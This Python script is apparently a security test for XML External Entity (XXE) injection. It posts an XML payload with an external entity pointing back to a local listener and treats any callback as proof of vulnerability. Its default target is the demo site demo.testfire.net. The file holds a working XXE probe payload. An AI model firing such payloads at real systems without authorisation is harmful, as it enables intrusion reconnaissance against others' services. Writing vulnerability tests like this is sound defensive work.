import socket
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import time

# Global flag to keep server running
keep_running = True

class SimpleLoggerHTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global xxe_success
        xxe_success = True  # Indicates that the XXE attack was successful
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        return  # Suppress normal HTTP server logs

class StoppableHTTPServer(HTTPServer):
    def serve_forever(self):
        global keep_running
        while keep_running:
            self.handle_request()

def start_logger_server(port):
    server_address = ('', port)
    httpd = StoppableHTTPServer(server_address, SimpleLoggerHTTPHandler)
    httpd.serve_forever()

def stop_logger_server():
    global keep_running
    keep_running = False

def test_xxe(target_url, logger_port):
    IPAddr = socket.gethostbyname(socket.gethostname())
    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://{IPAddr}:{logger_port}/">]>
<foo>&xxe;</foo>"""
    headers = {'Content-Type': 'application/xml'}
    try:
        response = requests.post(target_url, data=xml_payload, headers=headers, timeout=10)
    except requests.exceptions.RequestException as e:
        print("Failed to send request")

def runtest(url, port=8000):
    global xxe_success, keep_running
    xxe_success = False
    keep_running = True

    logger_thread = threading.Thread(target=start_logger_server, args=(port,))
    logger_thread.daemon = True
    logger_thread.start()

    time.sleep(1)  # Give server time to start
    test_xxe(url, port)

    time.sleep(5)  # Wait to see if logger catches any requests
    stop_logger_server()
    logger_thread.join()  # Ensure server has fully stopped

    return xxe_success


if __name__ == "__main__":
    test_url = "https://demo.testfire.net"
    is_vulnerable = runtest(test_url)
    print(f"Is the target vulnerable to XXE: {is_vulnerable}")
